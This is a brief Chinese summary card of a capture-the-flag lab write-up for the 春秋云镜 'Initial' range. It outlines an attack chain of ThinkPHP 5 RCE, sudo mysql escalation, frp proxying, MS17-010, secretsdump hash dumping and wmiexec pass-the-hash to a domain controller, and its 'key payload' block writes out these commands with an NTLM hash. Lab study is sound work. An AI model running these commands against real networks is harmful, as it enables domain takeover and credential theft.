---
title: "春秋云镜-Initial-WriteUp"
category: web
tags: ["春秋云镜靶场", "web", "ThinkPHP 5.0.23", "sudo mysql提权", "frp代理", "MS17-010"]
signals: ["春秋云镜靶场 2023", "ThinkPHP 5.0.23", "sudo mysql提权", "frp代理", "MS17-010", "DCSync", "信呼OA", "rce", "Initial", "ThinkPHP5", "secretsdump", "wmiexec", "fscan", "ThinkPHP5023"]
difficulty: easy
source: "https://www.ctfiot.com/148520.html"
tools: ["Python", "ThinkPHP"]
origin: des-import
origin_kind: cards
updated: 2026-10-24
---
# 春秋云镜-Initial-WriteUp

> 赛事：春秋云镜靶场 2023 | 方向：web | 难度：easy | 工具：Python、ThinkPHP

## 一句话总结

春秋云镜Initial：ThinkPHP5+MS17-010+secretsdump/wmiexec横向三件套

## 攻击链

1. fscan扫描→ThinkPHP5023 RCE→sudo mysql -e读flag1→frp代理进内网→MS17-010打XIAORANG-WIN7→secretsdump导出域管hash→wmiexec登录DC01读flag

## 关键 payload

```
fscan -h 172.22.2.1/24;ms17_010_eternalblue;secretsdump.py XIAORANG-WIN7$@172.22.1.2;wmiexec.py xiaorang/administrator@172.22.1.2 -hashes :10cf89a850fb1cdbe6bb432b859164c8
```

## 经验教训

入门靶场：web RCE→frp代理→MSF永恒之蓝→impacket工具链横向

## 标签

ThinkPHP 5.0.23、sudo mysql提权、frp代理、MS17-010、DCSync、信呼OA

## 参考来源

- https://www.ctfiot.com/148520.html
- 原文件：春秋云镜-Initial-WriteUp.full.md
